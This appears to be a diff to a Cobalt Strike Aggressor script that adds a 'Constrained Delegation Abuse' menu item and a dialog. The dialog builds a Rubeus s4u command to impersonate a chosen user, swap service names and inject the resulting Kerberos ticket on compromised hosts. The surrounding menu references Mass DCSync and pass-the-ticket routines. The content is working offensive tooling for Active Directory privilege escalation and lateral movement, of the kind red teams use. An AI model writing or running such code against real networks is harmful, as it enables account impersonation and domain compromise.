@@ -192,6 +192,18 @@ item "Elevate to Specified Token  - T1134"{
 
 #################################################
 
+#   Constrained Delegation Abuse
+
+#################################################
+	item "Constrained Delegation Abuse"{
+			local('$bid');
+				foreach $bid ($1){
+					cda($bid);
+					}
+				}
+				
+#################################################
+
 #   Mass DCSync
 
 #################################################
@@ -475,7 +487,29 @@ sub passticket{
 }
 
 
+#################################################
 
+#   Constrained Delegation Abuse
+
+#################################################
+sub cda{
+    $bid = $1;
+    $dialog = dialog("Abuse Constrained Delegation", %(impuser => "", msdsspn => "", altserv => "", ticket => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "s4u /impersonateuser:$3['impuser'] /msdsspn:$3['msdsspn'] /altservice:$3['altserv'] /ptt /ticket:$3['ticket']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Abusing Constrained Delegation...');
+            bexecute_assembly($bid, script_resource('/exe/Rubeus.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Abuse Constrained Delegation w/Rubeus");
+    drow_text($dialog, "impuser",  "Please Enter the User You Would Like To Impersonate");
+    drow_text($dialog, "msdsspn",  "Please Enter the SERVICE/SERVER:");
+    drow_text($dialog, "altserv",  "Please Enter the Alternate Service:");
+    drow_text($dialog, "ticket",  "Please Enter the Ticket:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+}
 
 #################################################
 
